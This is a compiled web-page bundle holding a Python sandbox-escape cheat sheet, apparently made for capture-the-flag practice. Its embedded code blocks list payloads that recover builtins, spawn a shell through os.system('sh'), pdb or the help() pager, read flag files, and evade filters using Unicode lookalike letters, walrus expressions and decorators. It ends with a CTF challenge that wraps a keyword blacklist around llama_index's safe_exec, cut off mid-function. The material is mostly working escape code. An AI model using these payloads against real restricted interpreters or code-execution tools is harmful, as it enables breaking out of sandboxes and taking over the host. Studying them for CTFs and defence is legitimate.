import{S as E_,i as h_,s as x_,C as Zc,w as A_,x as C_,y as L_,z as T_,A as Ik,f as F_,t as H_,B as R_,Y as Pk,l as a,r as k,a as u,m as t,n as p,u as r,h as s,c as i,p as l,b as e,J as c,E as D_}from"../../chunks/index-f2a82808.js";import{L as I_}from"../../chunks/layout-d6e193e1.js";import"../../chunks/utils-e126d158.js";function P_(Ss){let f,b,w,H,_,d,zs,Qt,R,Ys,de,np,D,Uk=`<code class="language-py"><span class="token comment"># obtain builtins from a globally defined built-in functions</span>
<span class="token comment"># https://docs.python.org/3/library/functions.html</span>
<span class="token keyword">print</span><span class="token punctuation">.</span>__self__
__build_class__<span class="token punctuation">.</span>__self__
<span class="token builtin">__import__</span><span class="token punctuation">.</span>__self__

<span class="token comment"># obtain builtins from site-module constants</span>
<span class="token comment"># https://docs.python.org/3/library/constants.html#constants-added-by-the-site-module</span>
<span class="token builtin">help</span><span class="token punctuation">.</span>__call__<span class="token punctuation">.</span>__builtins__ <span class="token comment"># or __globals__</span>
license<span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__builtins__ <span class="token comment"># or __globals__</span>

<span class="token comment"># obtain the builtins from a defined function</span>
func<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span></code>`,sp,I,Ws,ye,ap,P,Bk=`<code class="language-py">breakpoint<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># pdb -> import os; os.system("sh")</span>
<span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># import os; os.system("sh")</span>
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># __import__("os").system("sh")</span>

<span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># less pager -> !/bin/sh</span>
<span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># less pager -> :e/flag.txt</span>

<span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span> <span class="token punctuation">[</span> <span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span>
<span class="token comment"># to stderr</span>
<span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">float</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"/flag.txt"</span><span class="token punctuation">,</span><span class="token string">"exec"</span><span class="token punctuation">)</span>
<span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># to stdout</span>
<span class="token builtin">help</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span></code>`,tp,O,Vs,be,pp,U,Mk=`<code class="language-py"><span class="token comment"># &lt;class '_frozen_importlib.BuiltinImporter'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># &lt;class '_io._IOBase'> -> &lt;class '_io._RawIOBase'> -> &lt;class '_io.FileIO'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">111</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'os._wrap_close'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'subprocess.Popen'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">262</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"cat"</span><span class="token punctuation">,</span><span class="token string">"/flag.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token comment"># &lt;class 'abc.ABC'> -> &lt;class 'abc.ABCMeta'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'generator'> - instance</span>
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span><span class="token string">"_loader_"</span><span class="token string">"_"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span><span class="token string">"_builtins_"</span><span class="token string">"_"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token string">"_import_"</span><span class="token string">"_('os').system('sh')"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'async_generator'> - instance</span>
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span><span class="token string">"_loader_"</span><span class="token string">"_"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span><span class="token string">"_builtins_"</span><span class="token string">"_"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token string">"_import_"</span><span class="token string">"_('os').system('sh')"</span><span class="token punctuation">)</span></code>`,op,B,Gs,me,ep,M,qk=`<code class="language-py"><span class="token comment"># sys</span>
sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"module_name"</span><span class="token punctuation">]</span> <span class="token comment"># contains most of the builtin modules (https://docs.python.org/3/library/index.html)</span>
sys<span class="token punctuation">.</span>breakpointhook<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># same as breakpoint()</span>
sys<span class="token punctuation">.</span>_getframe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># numpy</span>
numpy<span class="token punctuation">.</span>loadtxt<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span> <span class="token comment"># stderr</span>

<span class="token comment"># pandas</span>
TBA

<span class="token comment"># pickle</span>
TBA</code>`,cp,q,$s,ve,lp,N,Xs,we,up,j,Nk=`<code class="language-py"><span class="token decorator annotation punctuation">@exec</span>
<span class="token decorator annotation punctuation">@input</span>
<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment"># or class a:pass</span>

<span class="token decorator annotation punctuation">@print</span>
<span class="token decorator annotation punctuation">@set</span>
<span class="token decorator annotation punctuation">@open</span>
<span class="token decorator annotation punctuation">@input</span>
<span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token decorator annotation punctuation">@print</span>&#92;r@<span class="token builtin">set</span>&#92;r@<span class="token builtin">open</span>&#92;r@<span class="token builtin">input</span>&#92;rclass\\x0ca<span class="token punctuation">:</span><span class="token keyword">pass</span></code>`,ip,S,Ks,ge,kp,z,jk=`<code class="language-py"><span class="token comment"># https://lingojam.com/ItalicTextGenerator</span>

<span class="token comment"># no ASCII</span>
\u{1D623}\u{1D633}\u{1D626}\u{1D622}\u{1D62C}\u{1D631}\u{1D630}\u{1D62A}\u{1D62F}\u{1D635}<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># import os;os.system("/bin/sh")</span>

<span class="token comment"># no ASCII letters, no double underscores, inside eval</span>
_\uFF3F\u{1D62A}\u{1D62E}\u{1D631}\u{1D630}\u{1D633}\u{1D635}\uFF3F_<span class="token punctuation">(</span>\u{1D62A}\u{1D62F}\u{1D631}\u{1D636}\u{1D635}<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span>\u{1D62A}\u{1D62F}\u{1D631}\u{1D636}\u{1D635}<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># double underscore bypass by having underscore + unicode underscore (https://www.compart.com/en/unicode/U+005F) -> U+FE33, U+FE34, U+FE4D, U+FE4E, U+FE4F, U+FF3F</span>

<span class="token comment"># no ASCII letters, no double underscores, no builtins, inside eval</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D62E}\u{1D633}\u{1D630}\uFF3F_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\u{1D62D}\u{1D630}\u{1D622}\u{1D625}_\u{1D62E}\u{1D630}\u{1D625}\u{1D636}\u{1D62D}\u{1D626}<span class="token punctuation">(</span><span class="token string">"\\157\\163"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span><span class="token string">"\\57\\142\\151\\156\\57\\163\\150"</span><span class="token punctuation">)</span>

<span class="token comment"># no ASCII letters, no double underscores, no builtins, no quotes/double quotes inside eval (>= python3.8)</span>
<span class="token punctuation">[</span>\u{1D63A}<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">,</span>\u{1D622}<span class="token operator">:=</span>y<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D62E}\u{1D633}\u{1D630}\uFF3F_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\u{1D62D}\u{1D630}\u{1D622}\u{1D625}_\u{1D62E}\u{1D630}\u{1D625}\u{1D636}\u{1D62D}\u{1D626}<span class="token punctuation">(</span>\u{1D63A}<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token operator">+</span>\u{1D622}<span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span>\u{1D622}<span class="token operator">+</span>\u{1D63A}<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># no ASCII letters, no double underscores, no builtins, no quotes/double quotes, no square brackets inside eval (>= python3.8)</span>
<span class="token punctuation">[</span>\u{1D625}<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">,</span>d<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F<span class="token builtin">dir</span>\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span>\u{1D634}<span class="token operator">:=</span>\u{1D625}<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D62E}\u{1D633}\u{1D630}\uFF3F_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D62D}\u{1D630}\u{1D622}\u{1D625}_\u{1D62E}\u{1D630}\u{1D625}\u{1D636}\u{1D62D}\u{1D626}<span class="token punctuation">(</span>\u{1D625}<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token operator">+</span>\u{1D634}<span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span>\u{1D634}<span class="token operator">+</span>\u{1D625}<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span></code>`,rp,Y,Zs,Ee,_p,W,Sk='<code class="language-py"><span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code>',fp,V,zk=`<code class="language-py"><span class="token comment"># eval</span>
<span class="token comment"># walrus operator</span>
<span class="token punctuation">[</span>a<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># setattr</span>
<span class="token builtin">setattr</span><span class="token punctuation">(</span>cobj<span class="token punctuation">,</span> <span class="token string">"field"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span>
cobj<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span><span class="token string">"field"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span>

<span class="token comment"># list comprehension</span>
<span class="token punctuation">[</span>cobj <span class="token keyword">for</span> cobj<span class="token punctuation">.</span>field <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"value"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span></code>`,dp,G,Js,he,yp,$,Yk=`<code class="language-py"><span class="token comment"># eval</span>
TBA

<span class="token comment"># exec</span>
TBA</code>`,bp,X,Qs,xe,mp,K,Wk=`<code class="language-py"><span class="token comment"># eval</span>

<span class="token comment"># exec</span>
<span class="token comment"># match</span>
<span class="token keyword">match</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">case</span> <span class="token builtin">object</span><span class="token punctuation">(</span>_\uFF3Fdoc\uFF3F_<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
      <span class="token keyword">pass</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment"># ().__doc__</span></code>`,vp,Z,na,Ae,wp,J,Vk=`<code class="language-py"><span class="token comment"># try...except</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
  <span class="token string">"&#123;0.__doc__.lol&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># format string can also be used to leak values</span>
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
  a <span class="token operator">=</span> e<span class="token punctuation">.</span>obj
  <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment"># ().__doc__</span></code>`,gp,Q,sa,Ce,Ep,nn,Gk='<code class="language-py"><span class="token comment"># TBA</span></code>',hp,sn,aa,Le,xp,an,ta,Te,Ap,g,La,E,Fe,He,y,Ta,Re,De,Fa,Ie,Pe,Ha,Oe,Ue,Ra,Be,Me,Da,qe,Cp,tn,pa,Ne,Lp,pn,Ia,h,je,Tp,on,oa,Se,Fp,en,$k=`<code class="language-py"><span class="token comment"># @salvatore-abello - type.__subclasses__(type)[0] -> &lt;class 'abc.ABCMeta'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"breakpoint"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Hp,cn,ea,ze,Rp,x,Pa,A,Ye,We,Oa,C,Ve,Dp,ln,ca,Ge,Ip,un,la,$e,Pp,kn,Ua,Ba,Xe,Op,rn,Xk=`<code class="language-py"><span class="token comment">#!/usr/local/bin/python</span>
<span class="token keyword">from</span> exec_utils <span class="token keyword">import</span> safe_exec
<span class="token keyword">def</span> <span class="token function">my_safe_exec</span><span class="token punctuation">(</span>__source<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># even MORE safe, surely nothing you can do now!!!</span>
    <span class="token keyword">assert</span> __source<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ascii check failed"</span>
    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"match"</span><span class="token punctuation">,</span> <span class="token string">"case"</span><span class="token punctuation">,</span> <span class="token string">"async"</span><span class="token punctuation">,</span> <span class="token string">"def"</span><span class="token punctuation">,</span> <span class="token string">"class"</span><span class="token punctuation">,</span> <span class="token string">"frame"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"byte"</span><span class="token punctuation">,</span> <span class="token string">"coding"</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
        <span class="token keyword">assert</span> x <span class="token keyword">not</span> <span class="token keyword">in</span> __source<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string"> is banned"</span></span>
    <span class="token keyword">return</span> safe_exec<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    __source <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter code: "</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>inp<span class="token operator">:=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"#EOF"</span><span class="token punctuation">:</span>
            __source <span class="token operator">+=</span> inp <span class="token operator">+</span> <span class="token string">"&#92;n"</span>
    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        my_safe_exec<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>
    <span class="token keyword">except</span> AssertionError <span class="token keyword">as</span> err<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span></code>`,Up,_n,Ma,qa,Ke,Bp,fn,Kk=`<code class="language-py"><span class="token comment"># code from https://github.com/run-llama/llama_index/blob/35afb6b93476ef4f4d61a48d847cd0b191ac5cb6/llama-index-experimental/llama_index/experimental/exec_utils.py</span>
<span class="token comment"># was main at the time of writing chall, however commit provided incase of changes</span>
<span class="token keyword">import</span> ast
<span class="token keyword">import</span> copy
<span class="token keyword">from</span> types <span class="token keyword">import</span> CodeType<span class="token punctuation">,</span> ModuleType
<span class="token keyword">from</span> typing <span class="token keyword">import</span> Any<span class="token punctuation">,</span> Dict<span class="token punctuation">,</span> Mapping<span class="token punctuation">,</span> Sequence<span class="token punctuation">,</span> Union

ALLOWED_IMPORTS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"math"</span><span class="token punctuation">,</span>
    <span class="token string">"time"</span><span class="token punctuation">,</span>
    <span class="token string">"datetime"</span><span class="token punctuation">,</span>
    <span class="token string">"pandas"</span><span class="token punctuation">,</span>
    <span class="token string">"scipy"</span><span class="token punctuation">,</span>
    <span class="token string">"numpy"</span><span class="token punctuation">,</span>
    <span class="token string">"matplotlib"</span><span class="token punctuation">,</span>
    <span class="token string">"plotly"</span><span class="token punctuation">,</span>
    <span class="token string">"seaborn"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">_restricted_import</span><span class="token punctuation">(</span>
    name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
